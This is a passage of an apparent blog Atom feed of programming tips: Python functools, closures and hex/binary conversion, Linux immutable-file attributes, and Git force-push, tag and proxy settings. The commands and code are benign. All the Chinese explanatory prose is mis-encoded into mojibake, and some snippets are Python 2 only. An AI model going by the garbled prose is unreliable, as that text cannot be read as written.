&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;Retrieve text of a Python Enhancement Proposal&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">resource&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;https://peps.python.org/pep-&lt;/span>&lt;span class="si">%04d&lt;/span>&lt;span class="s1">/&amp;#39;&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="n">num&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="n">urllib&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">urlopen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">resource&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">except&lt;/span> &lt;span class="n">urllib&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">error&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">HTTPError&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s1">&amp;#39;Not Found&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;blockquote>
&lt;p>å’Œ &lt;code>@cache&lt;/code> ç±»ä¼¼ï¼Œå‚æ•°ä¹Ÿå¿…é¡»æ˜¯ &lt;em>hashable&lt;/em> çš„ã€‚&lt;/p>
&lt;/blockquote>
&lt;h3 id="partial-object">Partial object&lt;/h3>
&lt;p>&lt;code>functools.partial&lt;/code> å‡½æ•°å¯ä»¥åˆ›å»ºä¸€ä¸ª &lt;em>partial object&lt;/em> ï¼Œ &lt;code>partial object&lt;/code> æ˜¯ä¸€ä¸ªå¯è°ƒç”¨çš„å¯¹è±¡ã€‚&lt;/p>
&lt;p>å­—é¢ä¸Šç¨å¾®æœ‰ç‚¹æŠ½è±¡ï¼Œçœ‹ä¸ªä¾‹å­å°±å¾ˆæ¸…æ™°äº†ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">functools&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">b&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">plus3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">functools&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">partial&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">add&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">plus3&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># out: 4&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">plus3&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># out: 10&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="é—­åŒ…ç¤ºä¾‹å¯¹å‡½æ•°è¿›è¡Œæ±‚å¯¼">é—­åŒ…ç¤ºä¾‹ï¼šå¯¹å‡½æ•°è¿›è¡Œæ±‚å¯¼&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">derivative&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Computes the numerical derivative of a function.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">df&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">dx&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mf">1e-6&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">dx&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="n">dx&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">df&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">g&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="o">**&lt;/span> &lt;span class="mi">2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># first derivative of g&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">dg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">derivative&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">g&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># second derivative of g&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">d2g&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">derivative&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dg&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="iterate-over-a-list-2-items-at-a-time">Iterate over a list 2 items at a time&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">c1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">c2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">zip&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">::&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">::&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span> &lt;span class="n">c1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">c2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>No-copy version:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">itertools&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">izip&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">islice&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">c1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">c2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">izip&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">islice&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">islice&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span> &lt;span class="n">c1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">c2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="hex-bin">Hex â†”Â Bin&lt;/h2>
&lt;p>Hex string to bin string:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;bd2866849ae03b59861d40dd8bb0d4&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">two&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="mi">16&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">two&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">zip&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">::&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">::&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">])])&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Bin string to hex string:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">binstr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s1">xbd(f&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s1">x84&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s1">x9a&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s1">xe0;Y&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s1">x86&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s1">x1d@&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s1">xdd&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s1">x8b&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s1">xb0&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s1">xd4&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="si">{0:02x}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">ord&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">c&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">binstr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></content><category scheme="https://mincodes.com/tags/python/" term="Python" label="Python"/></entry><entry><title type="text">Linux Tips: åªè¯»æ–‡ä»¶ Immutable files</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/linux-tips-immutable-files/"/><id>https://mincodes.com/posts/linux-tips-immutable-files/</id><updated>2022-12-04T13:09:00+00:00</updated><published>2022-12-03T10:28:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">æŸ¥çœ‹æ–‡ä»¶å±æ€§ 1 2 $ lsattr filename ----i-------- filename å­—æ¯ i æ„å‘³ç€è¯¥æ–‡ä»¶æ˜¯ä¸€ä¸ª Immutable ï¼ˆåªè¯»ï¼‰æ–‡ä»¶ã€‚ è®¾ç½®åªè¯»å±æ€§ï¼š 1 $ chattr +i filename å»æ‰åªè¯»å±â€¦</summary><content type="html">&lt;ul>
&lt;li>
&lt;p>æŸ¥çœ‹æ–‡ä»¶å±æ€§&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ lsattr filename
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">----i-------- filename
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å­—æ¯ &lt;code>i&lt;/code> æ„å‘³ç€è¯¥æ–‡ä»¶æ˜¯ä¸€ä¸ª Immutable ï¼ˆåªè¯»ï¼‰æ–‡ä»¶ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è®¾ç½®åªè¯»å±æ€§ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ chattr +i filename
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>å»æ‰åªè¯»å±æ€§ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">$ chattr -i filename
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul></content><category scheme="https://mincodes.com/tags/linux/" term="Linux" label="Linux"/><category scheme="https://mincodes.com/tags/tools/" term="Tools" label="Tools"/></entry><entry><title type="text">Git Tips</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/git-tips/"/><id>https://mincodes.com/posts/git-tips/</id><updated>2023-03-28T02:03:00+00:00</updated><published>2022-12-03T10:18:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">å®‰å…¨çš„å¼ºæ¨ push â€”froce-with-lease æ¨èä½¿ç”¨æ›´å®‰å…¨çš„ force push å‘½ä»¤ï¼š 1 git push --force-with-lease è¯¥ç‰ˆæœ¬å¯ä»¥ç¡®ä¿ï¼Œä¸ä¼šâ€¦</summary><content type="html">&lt;h2 id="å®‰å…¨çš„å¼ºæ¨-push-froce-with-lease">å®‰å…¨çš„å¼ºæ¨ push â€”froce-with-lease&lt;/h2>
&lt;p>æ¨èä½¿ç”¨æ›´å®‰å…¨çš„ force push å‘½ä»¤ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">git push --force-with-lease
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è¯¥ç‰ˆæœ¬å¯ä»¥ç¡®ä¿ï¼Œä¸ä¼šè¦†ç›–å…¶ä»–äººçš„æäº¤ã€‚å¦‚æœæœ‰å°šæœª fetch çš„è¿œç¨‹æäº¤ï¼Œè¯¥å‘½ä»¤ä¼šæç¤ºå¹¶ä¸­æ­¢æ‰§è¡Œã€‚&lt;/p>
&lt;h2 id="å®šä½æŸä¸ª-commit-åˆå…¥çš„ç‰ˆæœ¬">å®šä½æŸä¸ª commit åˆå…¥çš„ç‰ˆæœ¬&lt;/h2>
&lt;p>&lt;code>git name-rev &amp;lt;commit-id&amp;gt;&lt;/code>&lt;/p>
&lt;h2 id="æŸ¥çœ‹æœ¬åœ°å°šæœª-push-çš„æäº¤">æŸ¥çœ‹æœ¬åœ°å°šæœª push çš„æäº¤&lt;/h2>
&lt;p>&lt;code>git cherry -v&lt;/code>&lt;/p>
&lt;p>æŒ‡å®šè¦æ¯”è¾ƒçš„è¿œç¨‹åˆ†æ”¯ï¼š&lt;/p>
&lt;p>&lt;code>git cherry -v origin/somebranch&lt;/code>&lt;/p>
&lt;h2 id="merge--rebase">merge &amp;amp; rebase&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>æ‰§è¡Œ &lt;code>git checkout --ours path&lt;/code> ï¼ˆä»¥åŠ &lt;code>git checkout --theirs path&lt;/code> ï¼‰å‘½ä»¤æ—¶ï¼Œè¦æ ¼å¤–æ³¨æ„ï¼Œè¿™é‡Œçš„ &lt;em>ours&lt;/em> å’Œ &lt;em>theirs&lt;/em> å®¹æ˜“ææ··ï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>åœ¨åš &lt;em>merge&lt;/em> æ—¶ï¼š&lt;/p>
&lt;pre>&lt;code>- *ours* æŒ‡å½“å‰çš„åˆ†æ”¯
- *theirs* æŒ‡è¦åˆå…¥çš„ç›®æ ‡åˆ†æ”¯
&lt;/code>&lt;/pre>
&lt;/li>
&lt;li>
&lt;p>åœ¨åš &lt;em>rebase&lt;/em> æ—¶ï¼š&lt;/p>
&lt;pre>&lt;code>- *ours* æŒ‡ rebase å‚æ•°æ‰€æŒ‡å®šçš„åˆ†æ”¯
- *theirs* æŒ‡å½“å‰åœ¨åš rebase çš„åˆ†æ”¯
&lt;/code>&lt;/pre>
&lt;/li>
&lt;/ul>
&lt;p>åŸå› è§£é‡Šï¼šå› ä¸º &lt;em>rebase&lt;/em> æ˜¯é€šè¿‡ä¸€ç³»åˆ—çš„ &lt;em>cherry-pick&lt;/em> æ¥å®ç°çš„ï¼Œæ˜¯&lt;strong>æŠŠå½“å‰åˆ†æ”¯çš„ commit &lt;em>&lt;strong>&lt;strong>cherry-pick&lt;/strong>&lt;/strong>&lt;/em> åˆ°æŒ‡å®šåˆ†æ”¯&lt;/strong>ã€‚å› æ­¤ï¼Œåœ¨ &lt;em>cherry-pick&lt;/em> çš„è¿‡ç¨‹ä¸­ï¼ŒæŒ‡å®šçš„åˆ†æ”¯è¢«è§†ä¸º &lt;em>ours&lt;/em>ï¼Œè€Œè¢« rebase çš„å½“å‰åˆ†æ”¯è¢«è§†ä¸º &lt;em>theirs&lt;/em> ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://stackoverflow.com/a/2222920/1066512">&lt;code>HEAD~&lt;/code>&lt;/a>&lt;a href="https://stackoverflow.com/a/2222920/1066512"> å’Œ &lt;/a>&lt;a href="https://stackoverflow.com/a/2222920/1066512">&lt;code>HEAD^&lt;/code>&lt;/a>&lt;a href="https://stackoverflow.com/a/2222920/1066512"> çš„åŒºåˆ«&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="tags">Tags&lt;/h2>
&lt;p>push tags: &lt;code>git push --tags&lt;/code>&lt;/p>
&lt;p>rename tag:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">git tag new old
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git tag -d old
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># old å‰é¢çš„ `:` ä¼šä»è¿œç¨‹ä»“åº“ä¸­åˆ é™¤è¯¥ tag&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git push origin new :old
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="git-ä»£ç†é…ç½®">Git ä»£ç†é…ç½®&lt;/h2>
&lt;p>&lt;code>.gitconfig&lt;/code> é…ç½®ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">[user]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> email = username@gmail.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[http]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> proxy = localhost:7777
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>.gitconfig&lt;/code> æ–‡ä»¶å¯æ”¾åœ¨å®¶ç›®å½•ä¸‹ï¼ˆå½±å“å½“å‰ç”¨æˆ·ï¼‰ï¼Œäº¦å¯æ”¾åœ¨å•ä¸ª git ä»“åº“ä¸‹ï¼ˆä»…å½±å“å½“å‰ä»“åº“ï¼‰ã€‚&lt;/p>
&lt;p>ä¹Ÿå¯ä»¥é‡‡ç”¨å¦‚ä¸‹å‘½ä»¤æ¥è®¾ç½®ä»£ç†ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
